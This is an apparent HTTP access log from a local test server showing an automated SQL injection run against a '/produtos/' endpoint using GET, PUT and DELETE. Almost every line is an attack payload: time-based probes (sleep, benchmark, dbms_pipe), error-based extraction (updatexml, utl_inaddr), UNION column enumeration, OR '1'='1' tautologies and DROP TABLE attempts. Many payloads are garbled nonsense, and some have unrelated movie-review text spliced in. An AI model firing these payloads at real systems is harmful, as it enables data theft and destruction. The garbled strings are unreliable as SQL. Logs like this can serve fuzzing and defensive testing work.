Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20;%20as%20with%20the%20leavert%20)%20tablenatems%20(%20'1','/**/ HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20charaller/**/ HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20sybchacall*21%20)%20)%20- HTTP/1.1
172.18.0.1 - GET /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(callent%20)%20veratolue%20)%20+%20'sele,t%20gurn%20tabethe%20(%20'gtat',%20)%20char%20(%20103%20)%20,char%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%203745%20=%203745%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20) HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20S HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20SEM%20Af%20CORDERS%20FOR%20SYSEPSIBAS%20WHERE%20RIND%20)%20Der%20SUCLERD%20UNION%20SELECT%20@@VERSIon%20OR%20%22;%22%20NOT%20LIKE%20%22;%22 HTTP/1.1
172.18.0.1 - GET /produtos/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test%22%20OR%20%221%22=%221%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20as%20cdhm%20where%202104%20=%202104%20and%209660%20=%20(%20select%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/testselect%20*%20from%20users%20where%20id%20=%201%20or%201 HTTP/1.1
172.18.0.1 - GET /produtos/testseLect%20dBMS_PiPe.ReCeIve_MessAge%20(%20cHr%20(%20(SElect%201X215)%20)%20oR%20CHr/%20(%20(sELect%20(sElecT%20(seLECt%20(SElEct%2069))))%20)%20Or%20ChR%20(%20(SELECT%20(sEleCt%200x41))%20)%20oR%20CHR%20(%200x0X6a%20)%20,0x3%20)%20fROM%20DUAL%20AND%20(%20(%20%22%25%22%20liKe%20%22 HTTP/1.1
172.18.0.1 - GET /produtos/test1%20)%20as%20zvjk%20where%204246%20=%204246%20and%20updatexml%20(%203393,concat%20(%200x2e,0x7171706a71,%20(%20select%20(%20elt%20(%203393%20=%203393,1%20)%20)%20)%20,0x717a767a71%20)%20,1161%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20and%207756%20=%20dbms_utility.sqlid_to_sqlhash%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%207756%20=%207756%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cc HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20)%20as%20zohs%20where%202173%20=%202173%20writ%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20sgvo%20)%20)%20%7C%7C' HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20)%20)%20as%20vwbq%20where%201805%20=%201805 HTTP/1.1
172.18.0.1 - GET /produtos/test1%25'%20)%20)%20and%206537%20=%20dbms_pipe.receive_message%20(%20chr%20(%2076%20)%20%7C%7Cchr%20(%20116%20)%20%7C%7Cchr%20(%20117%20)%20%7C%7Cchr%20(%2065%20)%20,5%20)%20and%20(%20(%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - GET /produtos/test-9922'%20)%20)%20union%20all%20select%202193,2193,2193%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1%20)%20)%20as%20maxe%20where%205883%20=%205883%20and%206537%20=%20dbms_pipe.receive_message%20(%20chr%20(%2076%20)%20%7C%7Cchr%20(%20116%20)%20%7C%7Cchr%20(%20117%20)%20%7C%7Cchr%20(%2065%20)%20,5%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/testselect%20*%20from%20users%20where%20id%20=%201%20union%20select%20@%3C@$,version%20(%20)%20--%201 HTTP/1.1
172.18.0.1 - GET /produtos/test1%25'%20)%20union%20all%20select%20null,null,null%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1%20where%205466%20=%205466%20and%202388%20=%20benchmark%20(%205000000,md5%20(%200x6d457153%20)%20)%20 HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20and%20elt%20(%203114%20=%203114,sleep%20(%205%20)%20)%20 HTTP/1.1
172.18.0.1 - GET /produtos/test-4428%20)%20or%203038%20=%203038 HTTP/1.1
172.18.0.1 - GET /produtos/testselect%20(%20case%20when%20(%201093%20=%207693%20)%20then%201093%20else%201/%20(%20select%200%20)%20end%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test-9937'%20)%20)%20union%20all%20select%203900,3900,3900,3900,3900,3900,3900,3900,3900 HTTP/1.1
172.18.0.1 - GET /produtos/test1%20)%20as%20xwgf%20where%204204%20=%204204%20and%20sleep%20(%205%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20)%20)%20or%20sleep%20(%205%20)%20and%20(%20(%20%22mcyv%22%20=%20%22mcyv HTTP/1.1
172.18.0.1 - GET /produtos/test-8332%20)%20as%20eizx%20where%202298%20=%202299%20or%20(%208459%20=%208459%20)%20*4906%20-- HTTP/1.1
172.18.0.1 - GET /produtos/testI%20really%20enjoyed%20this%20movie.%20I%20feel%20bett%20the%20same%20as%20adventure.%20I%20love%20the%20story,%20the%20only%20reason%20I%20%22movies%20it.%20I%20mean,%20ROOL%20HOYRE%20ROGELS.%20This%20short%20is%20so%20low-budget%20and%20the%221%20)%20)%20and%209198%20=%209198%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20or%208514%20=%20benchmark%20(%205000000,md5%20(%200x544d5a4c%20)%20)%20 HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20and%20sleep%20(%205%20)%20and%20(%20(%20'jiio'%20like%20'jiio HTTP/1.1
172.18.0.1 - GET /produtos/test1%20or%20sleep%20(%205%20)%20 HTTP/1.1
172.18.0.1 - GET /produtos/test-3665%22))%20union%20all%20select%203445,3445,3445,3445,3445,3445 HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20)%20where%209020%20=%209020%20or%20row%20(%201045,7562%20)%20%3E%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%201045%20=%201045,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20(%20select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210%20) HTTP/1.1
172.18.0.1 - GET /produtos/test-4032%22%20)%20)%20or%203440%20=%20cast%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%203440%20=%203440%20)%20then%201%20else%200%20end%20)%20)%20::text%7C%7C%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20113 HTTP/1.1
172.18.0.1 - GET /produtos/test1%20)%20as%20wbcd%20where%209506%20=%209506%20or%20row%20(%201045,7562%20)%20%3E%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%201045%20=%201045,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20(%20select%208488%20union%20select%205584%20union%20select%203051%20union%20select HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20where%204684%20=%204684%20union%20all%20select%20null,null,null,null HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20as%20mcxe%20where%202203%20=%202202%20and%203715%20in%20(%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%203715%20=%203715%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20) HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20where%206774%20=%206774%20or%205286%20=%20(%20select%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20benchmart%20)%20,1000,1061%20)%20and%20'bovb'%20=%20'bbvb HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,alecture)%20ent%20a HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20table_caler',%20DaEnDER'%20)%20,%20@vErSIOn%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20-%20Table_name%20(%20chr%20(%20'sabetive%20gropappygy%20(cart*%20(%20Lyab/*)))) HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20verale_tember%20temanbed%20')%20,%201'%20=%20' HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20)%20and%20'vevite%20like%20'veft'%20=%20'tbfn HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20verseoncmate%20the%20(%202&%20&&%20thuen%20AND%20true%20OR%20False HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20,%20as%20tabltanchersely%20tibe_NAmebib%20(%201320 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@@@%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20sybchacall*12%20)%20)%20;and%20'ittt'%20like%20'tttt HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@@verscomance()%20)%20or%20%22Z%22%20NoT%20lIKE%20%22Z%22%20--%201' HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,male_came_tem/**/ HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20select%20@@verseon,%20)%20/**/ HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20table_name'%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@(%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20verseoncmane%20(%20'Dbo'%20)%20,VERsIOn%20(%20)%20--%200O1' HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20%7C%7C%20'i'%20LIKE%20'2 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20benchmart%20)%20,1000,1001%20)%20and%20(%201012%20=%201012 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20verale%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20;%20(%201%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20()%20),%20)%20,version%20(%20)%20,%20(%201,1%20)%20)%20%3E%201 HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20SEM%20UNOM;ALL%201%20'=%20;%20AND%20(%200x431%20LIKE%200o0b10111100001110 HTTP/1.1
172.18.0.1 - PUT /produtos/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test%22%20OR%20%221%22=%221 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20)%20or%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20ydpu%20)%20and%20(%20(%20'ytxg'%20=%20'ytxg HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20where%208469%20=%208469 HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20)%20as%20ndgd%20where%202367%20=%202367%20or%208156%20=%20(%20select%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20)%20as%20obzn%20where%207652%20=%207652%20or%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20ydpu%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/testselect%20*%20from%20generate_series%20(%207354,7354,case%20when%20(%204734%20=%202574%20)%20then%201%20else%200%20end%20)%20limit%201%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/testselect%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20and%20(%20(%20'xlvt'%20=%20'xlvt HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20)%20)%20)%20and%203754%20=%20(%20select%20upper%20(%20xmltype%20(%20chr%20(%2060%20)%20%7C%7Cchr%20(%2058%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%203754%20=%203754%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cch HTTP/1.1
172.18.0.1 - PUT /produtos/test1%25'%20)%20)%20and%206537%20=%20dbms_pipe.receive_message%20(%20chr%20(%2076%20)%20%7C%7Cchr%20(%20116%20)%20%7C%7Cchr%20(%20117%20)%20%7C%7Cchr%20(%2065%20)%20,5%20)%20and%20(%20(%20'%25'%20=%20' HTTP/1.1
172.18.0.1 - PUT /produtos/test1%25%22%20)%20)%20)%20or%207552%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20and%20(%20(%20(%20%22%25%22%20=%20%22 HTTP/1.1
172.18.0.1 - PUT /produtos/test1%25'%20)%20)%20and%204386%20=%20utl_inaddr.get_host_address%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%204386%20=%204386%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20) HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20where%208255%20=%208255%20or%201022%20=%20(%20select%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1%25%22%20)%20)%20or%202633%20=%20dbms_pipe.receive_message%20(%20chr%20(%20112%20)%20%7C%7Cchr%20(%2065%20)%20%7C%7Cchr%20(%2065%20)%20%7C%7Cchr%20(%20103%20)%20,5%20)%20and%20(%20(%20%22%25%22%20=%20%22 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20as%20kqbh%20where%206138%20=%206138 HTTP/1.1
172.18.0.1 - PUT /produtos/test1%22%20where%202999%20=%202999%20and%20(%209950%20=%209483,%209498%20)%20*4939%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20)%20)%20and%20updatexml%20(%203393,concat%20(%200x2e,0x7171706a71,%20(%20select%20(%20elt%20(%203393%20=%203393,1%20)%20)%20)%20,0x717a767a71%20)%20,1161%20)%20and%20(%20(%20(%20'vfnl'%20=%20'vfnl HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20)%20union%20all%20select%20null,null,null,null,null,null,null,null,null%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20where%207299%20=%207299%20rlike%20sleep%20(%205%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test-9054%22%20)%20as%20rgyu%20where%203792%20=%203792%20order%20by%201%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20where%204788%20=%204788%20or%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20ydpu%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test0B0O1%20)%20)%20)%20PRocedURE%20AnaLYse%20(%20EXtRACtvAlUE%20(%20(seLeCT%200X24D2),coNCAT%20(%200O0x5c,%20(%20BENcHMaRK%3C%20(%200X0x0c99b88,mD5%20(%200X0X4749504A%20)%7B%20)%20)%20)%20)%20,0x1%20)%20anD%20(select%20(SeleCt%20(SelECt%20(sELEcT%20(SeLECt%20(SELECT%20(SELECT%201)))))) HTTP/1.1
172.18.0.1 - PUT /produtos/test1%25'%20)%20)%20)%20and%203715%20in%20(%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%203715%20=%203715%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20)%20+char%20(%20122%20)%20+char%20(%20118%20)%20+char%20(%20122%20)%20+char HTTP/1.1
172.18.0.1 - PUT /produtos/testor%20pg_sleep%20(%20__TIME__%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/testselect%20(%20case%20when%20(%201291%20=%206612%20)%20then%201%20else%201291*%20(%20sel/**/ HTTP/1.1
172.18.0.1 - PUT /produtos/test-9379'%20)%20union%20all%20select%205965,5965,5965,5965,5965,5965,5965%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20)%20as%20dago%20where%209788%20=%209788 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20and%204386%20=%20utl_inaddr.get_host_address%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%204386%20=%204386%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20( HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20where%205279%20=%205279%20or%20sleep%20(%205%20)%20 HTTP/1.1
172.18.0.1 - PUT /produtos/test1%22%20)%20as%20ymto%20where%203453%20=%203453 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20-%20Table_name%20(%20chr%20(%20'1As'%20liKe%20'asap' HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20table_name'%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',')%20%3E%201%20/**/ HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20(,%20users,version%20(%20)%20and%201%20or%201%20=%201%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verale_chant%20(expattableredatebveries%20'= HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20versaolecert)%20FROM%20duar%20where%20ganner%20(%20@sbmen..bicctible%20(%20select%20(%20case%20when%20(%201250%20=%201805%20)%20then%201%20else%200x28*%20(%20select%201825%20from%20mysql.db%20)%20end%20)%20 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,male_came_tem/**/ HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20(%20table_samerial,name%20NOM%20LIKE%20'AS;%20LIFE%20',' HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20=%20'_' HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20'inve'%20time%20and%20' HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20ben1,1,1%20)%20,1',1/**/ HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20LIcE%20';&&@true,duli HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20benchmart%20)%20,1000,1001%20)%20and%20(%201012%20=%201012 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@(%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20ly%20)%20'/**/ HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20;%20as%20tible%20incomerates%20from%20itexure'%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20converse%20)%20tabennem%20tering%20as%20'that%20Guy'%20=%20'a HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20ullecale%20nomenatelbent%20'table' HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20benchmart%20)%20,0x50,10M1%20AND%20) HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20table_schema,table_name%20FROM%20inam$_1 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20gancer%20tabenema%20tabesilit%20as%20timt'%20)%20 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@@verscomand%202))%20or%20'F'%20NOT%20likE%20'C'%20aND%20%22E%22%20LiKE%20%22E%22%20OR%20False%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20_(%20,ull,fuln),%20call_uher_nem,),@@VerSiON%20aNd%20'b'='B' HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verseoncmate%20the%20Name%20=%20tubentame_tables%20the%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%203715%20=%203715%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20(%20113%20)%20+char HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20table_schema,table_name%20FROM%20iname_1; HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verseoncmane%20(%20'Dbo'%20/*C7G*/%20)%20,(seLect%20(SELECT%201))%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20SEM-1' HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%201%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20Se HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20S HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20SET%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20SEMANCULERSUNTROG%20'SURCH%20WHRRER%20MYRGRACM%20REGENTMANHE%20DRADED%20And%20TOD%20and%20%22Easpeet%20Surprise%20me%20than%20must%20be%20adaptation%22%20about%20a%20couple%20people%20in%20a%20strange%20subject%20matter.%20When%20he%20supposed%20to%20start%20at%20the%20time,%20and%20the%20story%20is%20about%20the HTTP/1.1
172.18.0.1 - DELETE /produtos/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test%22%20OR%20%221%22=%221 HTTP/1.1
172.18.0.1 - DELETE /produtos/test%22%20OR%20%221%22=%221 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20)%20as%20bksv%20where%205375%20=%205375 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%7C%7C%20(%20select%20'irfn'%20where%208360%20=%208360 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20as%20rngb%20where%206587%20=%206587%20and%209254%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20-- HTTP/1.1
